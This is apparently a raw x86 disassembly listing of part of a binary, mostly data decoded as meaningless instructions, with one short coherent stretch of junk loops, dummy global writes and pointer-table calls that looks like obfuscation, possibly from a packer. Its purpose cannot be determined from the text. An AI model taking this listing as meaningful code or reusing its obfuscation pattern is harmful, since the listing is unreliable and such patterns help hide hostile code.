  4138e7:	adc    DWORD PTR [edi+0x25ec2553],esi
  4138ed:	inc    ebp
  4138ee:	fbld   TBYTE PTR [esi+eiz*1+0x1c]
  4138f2:	xor    edx,esp
  4138f4:	sbb    BYTE PTR [ecx+ebx*2],al
  4138f7:	enter  0x1c3d,0x8
  4138fb:	scas   eax,DWORD PTR es:[edi]
  4138fc:	xor    bl,BYTE PTR [esi+0x3e]
  4138ff:	daa    
  413900:	sbb    BYTE PTR [ebx+0x2e],0xde
  413904:	cmc    
  413905:	lds    ebx,FWORD PTR [ecx-0x60]
  413908:	mov    edi,0x501749f4
  41390d:	fisub  WORD PTR [ebp+0x70]
  413910:	ret    
  413911:	mov    ebx,0xd75af874
  413916:	mul    BYTE PTR [ebx+0x6e]
  413919:	mov    ch,0xbc
  41391b:	call   0x4563dc8e
  413920:	fisub  DWORD PTR [eax]
  413922:	or     eax,0x1e5880fa
  413927:	(bad)  
  413929:	shr    DWORD PTR fs:[ebx-0x65fcbecc],cl
  413930:	(bad)  
  413931:	sbb    DWORD PTR [edi],esp
  413933:	sub    eax,0x34fe5f2a
  413938:	nop
  413939:	es lock pop eax
  41393c:	test   eax,0x441bd451
  413941:	enter  0x6ce9,0xd7
  413945:	out    dx,al
  413946:	lock mov esp,0x8f2327c6
  41394c:	push   0x7da85573
  413951:	push   eax
  413952:	pop    ds
  413953:	xchg   ecx,eax
  413954:	inc    bx
  413956:	popa   
  413957:	dec    esi
  413958:	pop    ebp
  413959:	sti    
  41395a:	in     al,0x68
  41395c:	pop    ss
  41395d:	aam    0xbe
  41395f:	mov    bh,0xdb
  413961:	add    al,0xe4
  413963:	fadd   QWORD PTR [eax+0x1e]
  413966:	cdq    
  413967:	sbb    bl,cl
  413969:	or     bl,BYTE PTR [ebp+0x6e]
  41396c:	je     0x41396b
  41396e:	cmp    eax,0x5af85963
  413973:	nop
  413974:	pop    ebp
  413975:	pop    edx
  413976:	adc    DWORD PTR [edx+0x79e4118a],esi
  41397c:	dec    ebx
  41397d:	inc    ebx
  41397e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41397f:	es cmp edi,esp
  413982:	sub    BYTE PTR [edx+esi*8],bl
  413985:	pop    ss
  413986:	cmp    al,ch
  413988:	pop    ecx
  413989:	dec    edi
  41398a:	push   edi
  41398b:	aas    
  41398c:	sbb    eax,0x269c9a57
  413991:	addr16 mov esi,0xfedd47af
  413997:	bound  ecx,QWORD PTR [edx-0x67]
  41399a:	xlat   BYTE PTR ds:[ebx]
  41399b:	and    DWORD PTR [ecx-0x6a],0xba26a528
  4139a2:	popa   
  4139a3:	push   ebx
  4139a4:	pop    eax
  4139a5:	popa   
  4139a6:	xchg   esp,eax
  4139a7:	inc    esp
  4139a8:	enter  0xebdb,0x75
  4139ac:	push   ss
  4139ad:	adc    esi,DWORD PTR [eax]
  4139af:	icebp  
  4139b0:	xchg   edi,eax
  4139b1:	cdq    
  4139b2:	data16 cld 
  4139b4:	mov    edx,0x98112c40
  4139b9:	jmp    0x587e14b1
  4139be:	das    
  4139bf:	in     al,0x16
  4139c1:	jmp    0xd007:0xcd5b7e09
  4139c8:	test   al,0x6f
  4139ca:	mov    ch,0x9f
  4139cc:	sar    BYTE PTR [ecx],1
  4139ce:	cdq    
  4139cf:	clc    
  4139d0:	fbstp  TBYTE PTR [edi]
  4139d2:	lds    edi,FWORD PTR [edi-0xc]
  4139d5:	outs   dx,DWORD PTR ds:[esi]
  4139d6:	dec    eax
  4139d7:	and    bh,BYTE PTR [si]
  4139da:	mov    ?,WORD PTR [edi+0x50]
  4139dd:	(bad)  
  4139de:	mov    edx,0x1b390688
  4139e3:	xor    BYTE PTR [ebx-0x45],cl
  4139e6:	push   ss
  4139e7:	imul   edx,DWORD PTR [ecx-0x3c078c4a],0xd34375de
  4139f1:	xchg   esp,eax
  4139f2:	sub    edi,edi
  4139f4:	cmp    BYTE PTR [ecx-0x3a],al
  4139f7:	inc    esp
  4139f8:	xchg   ebp,eax
  4139fa:	cld    
  4139fb:	xchg   ebp,eax
  4139fc:	popf   
  4139fd:	jl     0x41398d
  4139ff:	stos   BYTE PTR es:[edi],al
  413a00:	aad    0xef
  413a02:	adc    al,0x38
  413a04:	std    
  413a05:	push   edi
  413a06:	jo     0x41398d
  413a08:	shl    bh,1
  413a0a:	mov    dh,0x43
  413a0c:	jl     0x413a0b
  413a0e:	cmp    eax,DWORD PTR [ebx+0x12]
  413a11:	sar    dh,cl
  413a13:	outs   dx,DWORD PTR ds:[esi]
  413a14:	sub    BYTE PTR [ecx+0x7727b05e],ah
  413a1a:	jae    0x413a52
  413a1c:	dec    esi
  413a1d:	imul   esi,DWORD PTR [edi+eax*1+0x21a01802],0xd6b8cb8c
  413a28:	mov    edi,0x8125eb00
  413a2d:	aam    0x30
  413a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a30:	jmp    0xa43310ef
  413a35:	call   0x8216e004
  413a3a:	aam    0x67
  413a3c:	(bad)  
  413a3d:	call   0xf68ed39
  413a42:	mov    dh,0xa8
  413a44:	and    DWORD PTR [eax+0x58],ebp
  413a47:	jmp    0x6dd20707
  413a4c:	mov    edi,0xa704f39a
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	pop    ds
  413a68:	test   BYTE PTR [ebx+0x70687e81],ch
  413a6e:	jo     0x413a29
  413a70:	jle    0x413ae2
  413a72:	jo     0x413a35
  413a74:	or     ebp,DWORD PTR [eax-0x7811cd74]
  413a7a:	xchg   ebx,eax
  413a7b:	ins    BYTE PTR es:[edi],dx
  413a7c:	not    bh
  413a7e:	sbb    ebx,0x82ccd267
  413a84:	adc    edi,edx
  413a86:	xchg   esp,eax
  413a87:	fistp  QWORD PTR [esi+0x1e]
  413a8a:	and    eax,0xae13881a
  413a8f:	scas   al,BYTE PTR es:[edi]
  413a90:	sti    
  413a91:	shr    DWORD PTR [ebp+0x3e0f69c9],0xab
  413a98:	sub    al,BYTE PTR [esi]
  413a9a:	je     0x413aea
  413a9c:	sub    BYTE PTR [ebx+edi*2-0x5d0c13be],bh
  413aa3:	retf   
  413aa4:	nop
  413aa5:	push   cs
  413aa6:	imul   edi,DWORD PTR [edx-0x2],0xffffffa0
  413aaa:	hlt    
  413aab:	aam    0xe
  413aad:	std    
  413aae:	mov    al,0x2c
  413ab0:	daa    
  413ab1:	cs adc al,0x97
  413ab4:	and    WORD PTR [ecx-0x79e427e4],bx
  413abb:	int    0xe2
  413abd:	loope  0x413a89
  413abf:	gs or  al,0xa9
  413ac2:	mov    al,0xab
  413ac4:	cld    
  413ac5:	ret    0xb6e7
  413ac8:	push   es
  413ac9:	ror    DWORD PTR ds:0x1976edbe,cl
  413acf:	pop    edi
  413ad0:	fstp   DWORD PTR [edx-0x48]
  413ad3:	int    0xa
  413ad5:	or     BYTE PTR [eax],ch
  413ad7:	sahf   
  413ad8:	fdiv   DWORD PTR [esi+edi*4-0x70a117b6]
  413adf:	fisubr WORD PTR [ecx-0x4c]
  413ae2:	arpl   WORD PTR [eax+0x260c89dd],di
  413ae8:	retf   0x2ecb
  413aeb:	inc    esp
  413aec:	sti    
  413aed:	sub    cl,bl
  413aef:	sbb    eax,0xc7c8467b
  413af4:	shl    DWORD PTR [esi+esi*1+0x48dbfe8],1
  413afb:	icebp  
  413afc:	leavew 
  413afe:	or     al,ch
  413b00:	test   BYTE PTR ds:0xc432095f,0xc7
  413b07:	mov    ch,0x89
  413b09:	test   al,0x60
  413b0b:	adc    esp,DWORD PTR [eax+0x38]
  413b0e:	xchg   edx,eax
  413b0f:	rol    DWORD PTR [edi+ebp*4],0x73
  413b13:	out    dx,al
  413b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b15:	ds xchg esp,eax
  413b17:	xchg   ecx,eax
  413b18:	imul   edx,ecx,0x69bd724c
  413b1e:	jb     0x413ad7
  413b20:	jmp    0xc8629916
  413b25:	push   ss
  413b26:	jmp    0x620f:0x2ff7a25a
  413b2d:	dec    edx
  413b2e:	enter  0x8a15,0x78
  413b32:	xor    bl,BYTE PTR [eax+eax*8-0x10]
  413b36:	and    eax,DWORD PTR [ebp+0x6550cbd0]
  413b3c:	mov    bh,0xf8
  413b3e:	je     0x413afd
  413b40:	out    dx,al
  413b41:	push   ebx
  413b42:	cwde   
  413b43:	(bad)  
  413b44:	push   0xffffffc2
  413b46:	pop    esi
  413b47:	in     al,0x3d
  413b49:	repz (bad) 
  413b4c:	or     edx,DWORD PTR [ebp+esi*2+0x3da537fb]
  413b53:	pop    eax
  413b54:	rol    DWORD PTR [ecx+0x9],1
  413b57:	in     eax,dx
  413b58:	add    eax,0x51e80838
  413b5d:	ins    DWORD PTR es:[edi],dx
  413b5e:	stos   BYTE PTR es:[edi],al
  413b5f:	push   ds
  413b60:	jae    0x413bbd
  413b62:	cmp    bh,BYTE PTR [esi+0x50]
  413b65:	xor    DWORD PTR [edx+0x25],esp
  413b68:	add    al,BYTE PTR [ecx-0x53c3b5]
  413b6e:	aam    0x8d
  413b70:	test   DWORD PTR [edx+0x2b87db6b],0xafff7286
  413b7a:	dec    edx
  413b7b:	shl    edi,cl
  413b7d:	je     0x413bb5
  413b7f:	ja     0x413bf2
  413b81:	mov    ecx,0x56106c07
  413b86:	mov    dh,0x45
  413b88:	pushf  
  413b89:	sub    DWORD PTR [ebp-0x3d89e042],ecx
  413b8f:	(bad)  
  413b90:	or     esp,DWORD PTR [eax-0x2246b54b]
  413b96:	std    
  413b97:	add    BYTE PTR [edi-0x11],cl
  413b9a:	inc    ebp
  413b9b:	aam    0x46
  413b9d:	inc    esp
  413b9e:	adc    DWORD PTR [ebp+0x35],0x5cd33c32
  413ba5:	int3   
  413ba6:	lods   eax,DWORD PTR ds:[esi]
  413ba7:	imul   ecx,ebp,0xbc2b1aae
  413bad:	cmp    ebp,DWORD PTR [edx-0x52]
  413bb0:	call   0x6fae:0x952aadec
  413bb7:	mov    ah,0xd0
  413bba:	jp     0x413bbd
  413bbc:	out    0x2e,eax
  413bbe:	cmp    DWORD PTR fs:[edx-0x1b],eax
  413bc2:	fnstenv [ebp+0x77]
  413bc5:	sub    DWORD PTR [edi+esi*4+0x1559fbb],ecx
  413bcc:	lods   eax,DWORD PTR ds:[esi]
  413bcd:	jle    0x413bfd
  413bcf:	pop    eax
  413bd0:	dec    ebp
  413bd1:	nop
  413bd2:	mov    dl,0x2f
  413bd4:	mov    dl,0x4d
  413bd6:	sti    
  413bd7:	lahf   
  413bd8:	inc    esi
  413bd9:	sub    ebx,DWORD PTR [esi+0x78901950]
  413bdf:	dec    ecx
  413be0:	jno    0x413c1a
  413be2:	(bad)  
  413be3:	loopne 0x413c4c
  413be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be6:	cli    
  413be7:	and    eax,0xaacd55b1
  413bec:	xchg   edi,eax
  413bed:	sar    BYTE PTR [esi+0x5b44895d],0x95
  413bf4:	iret   
  413bf5:	mov    ebx,0x5f152d94
  413bfa:	add    eax,0x2bf6b1d3
  413bff:	pop    ds
  413c00:	test   al,0xfd
  413c02:	sbb    edx,DWORD PTR [edx+0x74]
  413c05:	jmp    0x6bf2315
  413c0a:	add    esi,DWORD PTR [ebp-0x4429a409]
  413c10:	(bad)  
  413c11:	adc    BYTE PTR [edx+eiz*1],dh
  413c14:	push   ss
  413c15:	data16 add BYTE PTR [ebp-0x2a],bh
  413c19:	add    dh,cl
  413c1b:	mov    ecx,0xfba3c049
  413c20:	pop    esi
  413c21:	lahf   
  413c22:	lock repnz xchg edx,eax
  413c25:	xchg   ebx,eax
  413c26:	xor    al,0xaf
  413c28:	hlt    
  413c29:	mul    DWORD PTR [eax]
  413c2b:	sub    WORD PTR [eiz*4+0x71ec6ead],si
  413c33:	sub    BYTE PTR [ebp-0x6d],al
  413c36:	mov    DWORD PTR [ebp+0x18],ebx
  413c39:	cdq    
  413c3a:	xlat   BYTE PTR ds:[ebx]
  413c3b:	push   0xffffffd4
  413c3d:	push   0xa630d82f
  413c42:	cmp    eax,0x1dcd972
  413c47:	aam    0x80
  413c49:	jecxz  0x413c93
  413c4b:	repnz cli 
  413c4d:	hlt    
  413c4e:	jg     0x413c91
  413c50:	test   BYTE PTR ds:0xaab7319e,bh
  413c56:	repz test eax,0x79bb034d
  413c5c:	fcomip st,st(7)
  413c5e:	jp     0x413c3e
  413c60:	mov    ecx,0x33626d9e
  413c65:	adc    eax,DWORD PTR [esp+eax*2+0x6]
  413c69:	out    0x9b,al
  413c6b:	hlt    
  413c6c:	xor    ebx,eax
  413c6e:	mov    edx,edx
  413c70:	and    esp,eax
  413c72:	xor    eax,0xeb6872bd
  413c77:	loope  0x413c0a
  413c79:	pop    esp
  413c7a:	fmul   QWORD PTR [eax]
  413c7c:	sub    DWORD PTR [eax-0x73],esi
  413c7f:	outs   dx,DWORD PTR ds:[esi]
  413c80:	push   ss
  413c81:	cli    
  413c82:	leave  
  413c83:	dec    ebp
  413c84:	sub    al,0x84
  413c86:	mov    esi,0x787b198c
  413c8b:	mov    ah,0x3
  413c8d:	fs mov bl,0x9d
  413c90:	imul   ebp,DWORD PTR [esi],0xffffffb8
  413c93:	(bad)  
  413c95:	dec    ebp
  413c96:	mov    ch,0x50
  413c98:	push   edi
  413c99:	int3   
  413c9a:	cdq    
  413c9b:	pop    eax
  413c9c:	jmp    0x9de2:0xa520ae1a
  413ca3:	inc    edx
  413ca4:	mov    bh,0xfe
  413ca6:	out    0x84,eax
  413ca8:	mov    esi,0x9d1f8bd7
  413cad:	outs   dx,DWORD PTR ds:[esi]
  413cae:	dec    edx
  413caf:	test   BYTE PTR [esi-0x6],dh
  413cb2:	mov    esi,0xb79eb6c9
  413cb7:	psllq  mm5,QWORD PTR [edx+eiz*2]
  413cbb:	cmp    DWORD PTR [ebx-0x7ca16c97],0x65
  413cc2:	mov    ah,0xda
  413cc4:	dec    ebx
  413cc5:	out    0x99,eax
  413cc7:	dec    ebx
  413cc8:	sahf   
  413cc9:	sbb    ch,BYTE PTR [esi-0x3a6d02c4]
  413ccf:	pop    edx
  413cd0:	shr    BYTE PTR [esi+esi*8],cl
  413cd3:	mov    al,BYTE PTR [edx+eiz*1+0x42f5fda4]
  413cda:	xor    DWORD PTR [ebx],0x1832fc52
  413ce0:	xchg   edi,eax
  413ce1:	cmovg  ecx,edx
  413ce4:	hlt    
  413ce5:	adc    DWORD PTR [ecx+ebp*1-0x38],esp
  413ce9:	or     al,0x33
  413ceb:	and    dh,BYTE PTR [edx+0x64ed28c4]
  413cf1:	in     al,0xec
  413cf3:	xor    ah,BYTE PTR [eax]
  413cf5:	in     al,0x14
  413cf7:	inc    eax
  413cf8:	clc    
  413cf9:	and    DWORD PTR [ecx+esi*1],0x9dc06475
  413d00:	push   ecx
  413d01:	xchg   DWORD PTR [eax+0x44],ecx
  413d04:	jmp    0x227c:0xfff4bf4
  413d0b:	adc    eax,0xbdae169d
  413d10:	pop    edx
  413d11:	jmp    0x6de8:0x448de6c0
  413d18:	retf   
  413d19:	(bad)  
  413d1a:	aad    0x9e
  413d1c:	jmp    0xb58c:0xd35f1f59
  413d23:	inc    esp
  413d24:	ds and al,0x8b
  413d27:	gs hlt 
  413d29:	inc    esi
  413d2a:	aaa    
  413d2b:	fst    QWORD PTR [edi+ebx*1-0x16b0e6e5]
  413d32:	(bad)  
  413d33:	cmp    al,0x8b
  413d35:	push   ss
  413d36:	shr    DWORD PTR [esi],cl
  413d38:	xchg   edx,eax
  413d39:	ins    BYTE PTR es:[edi],dx
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e67f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e67f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e67f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e4eb
  413d7f:	cmp    DWORD PTR ds:0x42e67f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e67f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e67f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e67f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e67f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e68f,0x42fd06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e0ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e677
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fc59,0x42e0a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e67b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e67b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e67b,eax
  413e08:	cmp    DWORD PTR ds:0x42e67b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e67b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e40b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fc81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e677,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e683
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e09c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e67b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	out    dx,al
  413e8c:	sub    al,BYTE PTR [ebp+0x7076476a]
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e39
  413e98:	int3   
  413e99:	imul   ebp,esi,0xffffff96
  413e9c:	out    dx,eax
  413e9d:	adc    bh,ch
  413e9f:	add    ah,dl
  413ea1:	jp     0x413ebe
  413ea3:	adc    edi,DWORD PTR [edx-0x1d2fc134]
  413ea9:	arpl   WORD PTR [eax+0x57],ax
  413eac:	xor    eax,0xeaf27b74
  413eb1:	retf   
  413eb2:	dec    ebx
  413eb3:	retf   
  413eb4:	nop
  413eb5:	jp     0x413e78
  413eb7:	repnz cmp BYTE PTR [edi+ebx*2],dh
  413ebb:	jo     0x413eef
  413ebd:	stos   DWORD PTR es:[edi],eax
  413ebe:	mov    esp,0xb08e69ad
  413ec3:	push   ebp
  413ec4:	data16 out 0x10,al
  413ec7:	xlat   BYTE PTR ds:[ebx]
  413ec8:	or     ah,al
  413eca:	xchg   ebx,eax
  413ecb:	xor    DWORD PTR [esi-0x4f],ebx
  413ece:	push   ebp
  413ecf:	mov    ah,0x8e
  413ed1:	lock push 0xffffffa0
  413ed4:	scas   al,BYTE PTR es:[edi]
  413ed5:	jle    0x413e7e
  413ed7:	or     eax,0xbc230b4a
  413edc:	ret    
  413edd:	daa    
  413ede:	push   cs
  413edf:	push   ecx
  413ee0:	pop    edx
  413ee1:	pop    edx
  413ee2:	pop    ecx
  413ee3:	jg     0x413f02
  413ee5:	mov    ds,WORD PTR [ecx]
  413ee7:	cmp    BYTE PTR [ebx+0xa46acba],dl
  413eed:	push   ebp
  413eee:	lods   al,BYTE PTR ds:[esi]
  413eef:	push   0xaf21df65
  413ef4:	data16 jmp 0x413ec8
  413ef7:	mov    edx,0xcacb9d31
  413efc:	or     dh,BYTE PTR [ecx+0x1d]
  413eff:	shl    bh,1
  413f01:	push   ds
  413f02:	jb     0x413f36
  413f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f05:	dec    edx
  413f06:	(bad)  
  413f07:	stos   DWORD PTR es:[edi],eax
  413f08:	aam    0x64
  413f0a:	out    dx,eax
  413f0b:	dec    ebx
  413f0c:	inc    esi
  413f0d:	mov    edx,0xa6653aee
  413f12:	in     al,dx
  413f13:	inc    eax
  413f14:	and    esp,edi
  413f16:	xchg   ebp,eax
  413f17:	test   al,0x7d
  413f19:	mov    al,0xe3
  413f1b:	adc    edi,DWORD PTR [ecx]
  413f1d:	nop
  413f1e:	or     esi,DWORD PTR [ebx]
  413f20:	mov    BYTE PTR [edx],dh
  413f22:	sub    DWORD PTR [ebx],ecx
  413f24:	cmp    al,0x4a
  413f26:	push   ss
  413f27:	cdq    
  413f28:	lock mov dh,0x6d
  413f2b:	bound  esi,QWORD PTR [ecx+edi*1+0x5739b53e]
  413f32:	dec    edi
  413f33:	xor    eax,0x11796683
  413f38:	(bad)  
  413f39:	or     eax,0x8c8af9bf
  413f3e:	sub    BYTE PTR [esp+ecx*4-0x7b612a11],0xbf
  413f46:	push   cs
  413f47:	(bad)  
  413f48:	aaa    
  413f49:	jnp    0x413f68
  413f4b:	jnp    0x413f53
  413f4d:	hlt    
  413f4e:	inc    BYTE PTR [ebx]
  413f50:	rcr    DWORD PTR [esi-0x7aa34b18],cl
  413f56:	add    esp,0xb18d48ce
  413f5c:	mov    BYTE PTR [ecx+0x4d],dh
  413f5f:	xor    bl,BYTE PTR [ecx]
  413f61:	jl     0x413ef6
  413f63:	xchg   edi,eax
  413f64:	enter  0x9a79,0x15
  413f68:	fadd   st,st(1)
  413f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f6b:	xchg   esi,eax
  413f6c:	push   ebp
  413f6d:	inc    ebx
  413f6e:	fsub   DWORD PTR [ecx-0x614c618]
  413f74:	pop    ecx
  413f75:	or     BYTE PTR [ebp+0x350fd37d],bh
  413f7b:	or     al,0xd6
  413f7d:	or     eax,0x5885112c
  413f82:	cdq    
  413f83:	sbb    DWORD PTR ds:0xb4c99ac1,0xffffffeb
  413f8a:	out    dx,al
  413f8b:	jae    0x413fce
  413f8d:	popa   
  413f8e:	out    dx,al
  413f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f90:	ret    0x7f5
  413f93:	inc    edi
  413f94:	stos   BYTE PTR es:[edi],al
  413f95:	mov    dh,BYTE PTR [esi]
  413f97:	loop   0x413ff8
  413f99:	inc    esp
  413f9a:	mov    ebp,0x3684c3ff
  413f9f:	test   DWORD PTR [ecx+eax*2],edx
  413fa2:	push   ss
  413fa3:	pusha  
  413fa4:	add    ah,BYTE PTR [esi]
  413fa6:	sbb    BYTE PTR [ebx],bl
  413fa8:	sbb    edi,DWORD PTR ds:0x964ebb5
  413fae:	scas   eax,DWORD PTR es:[edi]
  413faf:	sub    eax,DWORD PTR [edi+0x354f6e46]
  413fb5:	pop    ss
  413fb6:	push   0x130e5f1
  413fbb:	xlat   BYTE PTR ds:[ebx]
  413fbc:	out    0x9e,eax
  413fbe:	ret    0xd636
  413fc1:	mov    al,BYTE PTR [ecx+0x25]
  413fc4:	stc    
  413fc5:	xchg   ecx,eax
  413fc6:	call   0x2586:0xd10c2ab4
  413fcd:	jo     0x41404b
  413fcf:	mov    WORD PTR [edx],cs
  413fd1:	loope  0x413f7c
  413fd3:	and    eax,0x70b51d02
  413fd8:	and    eax,0xa6907552
  413fdd:	push   esp
  413fde:	loop   0x413fd9
  413fe0:	(bad)  
  413fe1:	xchg   edi,eax
  413fe2:	mov    eax,ds:0xab80f693
  413fe7:	out    0xa6,eax
  413fe9:	pop    ebp
  413fea:	in     eax,dx
  413feb:	sti    
  413fec:	inc    ebx
  413fed:	push   0x30
  413fef:	mov    al,ds:0x83218cbd
  413ff4:	ror    ch,cl
  413ff6:	sub    DWORD PTR [ebp-0x3e],ebx
  413ff9:	jmp    0x180a:0xe972dc5a
  414000:	xchg   ecx,eax
  414001:	inc    edi
  414002:	add    al,0x31
  414004:	and    al,0xb4
  414006:	mov    ecx,0x8d13b29b
  41400b:	mov    ebx,0xd1124859
  414010:	jmp    0x413ff7
  414012:	popf   
  414013:	push   ss
  414014:	into   
  414015:	mov    ?,WORD PTR [ebx]
  414017:	pop    ss
  414018:	xchg   ecx,eax
  414019:	call   DWORD PTR [edx-0x609e4973]
  41401f:	adc    DWORD PTR [ebp-0x649e4cff],esp
  414025:	cli    
  414026:	xchg   ecx,eax
  414027:	pushf  
  414028:	stos   BYTE PTR es:[edi],al
  414029:	xor    al,0x95
  41402b:	mov    ebp,0x77b387a1
  414030:	mov    al,BYTE PTR [edx-0xa]
  414033:	daa    
  414034:	outs   dx,DWORD PTR ds:[esi]
  414035:	adc    DWORD PTR [esi-0x35],esi
  414038:	cmp    ebp,ecx
  41403a:	mov    edi,0x886c43d6
  41403f:	std    
  414040:	sbb    BYTE PTR [esi],cl
  414042:	or     ebp,DWORD PTR [edx-0x61]
  414045:	or     ah,BYTE PTR [ecx-0x30fb4499]
  41404b:	aas    
  41404c:	jecxz  0x4140ab
  41404e:	mul    BYTE PTR [ebx]
  414050:	jge    0x4140c0
  414052:	sbb    DWORD PTR [ebx],esp
  414054:	sbb    eax,0xe474b6e0
  414059:	pop    esi
  41405a:	pop    eax
  41405b:	cmp    bl,BYTE PTR [edx-0x79]
  41405e:	rol    ebx,1
  414060:	dec    edx
  414061:	imul   DWORD PTR [esi+0x1c73707f]
  414067:	pop    esp
  414068:	aaa    
  414069:	fwait
  41406a:	jl     0x414042
  41406c:	fnstsw WORD PTR [eax+0x243d91b2]
  414072:	or     BYTE PTR ds:0x578fea48,dh
  414078:	push   ebx
  414079:	jae    0x4140c1
  41407b:	js     0x41402a
  41407d:	loop   0x4140fb
  41407f:	pusha  
  414080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414081:	mov    ecx,DWORD PTR [ebx-0x4179fbe7]
  414087:	fidivr DWORD PTR [eax-0x413a4327]
  41408d:	lods   al,BYTE PTR ds:[esi]
  41408e:	shr    al,1
  414090:	push   ss
  414091:	pop    edx
  414092:	or     al,0x1d
  414094:	mov    eax,0x1c3c4269
  414099:	ss clc 
  41409b:	dec    eax
  41409c:	call   0x2577a043
  4140a1:	adc    al,0x6b
  4140a3:	enter  0x16c6,0x92
  4140a7:	test   DWORD PTR [edx],eax
  4140a9:	add    ah,dl
  4140ab:	cmc    
  4140ac:	inc    eax
  4140ad:	adc    al,0x44
  4140af:	push   0xc0c61036
  4140b4:	sub    eax,0xa8d13e9f
  4140b9:	shl    DWORD PTR [eax-0x1a6a5d6e],1
  4140bf:	and    ch,BYTE PTR [eax-0x80]
  4140c2:	out    dx,eax
  4140c3:	xchg   cl,ah
  4140c5:	enter  0xdf2,0x3f
  4140c9:	loopne 0x414100
  4140cb:	or     eax,0x4f1e5d9a
  4140d0:	imul   esi,DWORD PTR [edx+0x3ba048dd],0x50aae85c
  4140da:	sti    
  4140db:	pmaxub mm4,mm3
  4140de:	addr16 lock mov ebp,ebp
  4140e2:	jg     0x414067
  4140e4:	mov    BYTE PTR [esi+ecx*4+0xf],dl
  4140e8:	pop    ds
  4140e9:	or     BYTE PTR [esi-0x67],dh
  4140ec:	ins    WORD PTR es:[edi],dx
  4140ee:	mov    ds:0xf3734f4e,eax
  4140f3:	test   BYTE PTR [ebx+0x36],al
  4140f6:	outs   dx,BYTE PTR ds:[esi]
  4140f7:	fidivr WORD PTR [edi-0x6c9a16bd]
  4140fd:	pop    esp
  4140fe:	mov    BYTE PTR [ecx-0x620861f2],dh
  414104:	scas   eax,DWORD PTR es:[edi]
  414105:	jbe    0x41415b
  414107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414108:	pushf  
  414109:	inc    edi
  41410a:	xchg   ebp,eax
  41410b:	fisub  DWORD PTR [edx-0x41036380]
  414111:	mov    ds:0xdb1acd8c,al
  414116:	aad    0x57
  414118:	dec    eax
  414119:	mov    eax,ds:0x3c616ac1
  41411e:	call   0xd3dd:0x98c9952f
  414125:	call   0x66f2:0x3331af27
  41412c:	xchg   edi,eax
  41412d:	mov    ebx,DWORD PTR [ebx]
  41412f:	pop    edi
  414130:	xor    ebx,DWORD PTR [ebx+0x3b]
  414133:	fild   DWORD PTR [esi+0x44]
  414136:	jno    0x4140df
  414138:	xchg   DWORD PTR [ecx],ebp
  41413a:	mov    ch,0xdd
  41413c:	mov    ebx,0xf557b6bf
  414141:	mov    ecx,0xc82f7497
  414146:	aam    0xe5
  414148:	scas   al,BYTE PTR es:[edi]
  414149:	dec    edi
  41414a:	push   ds
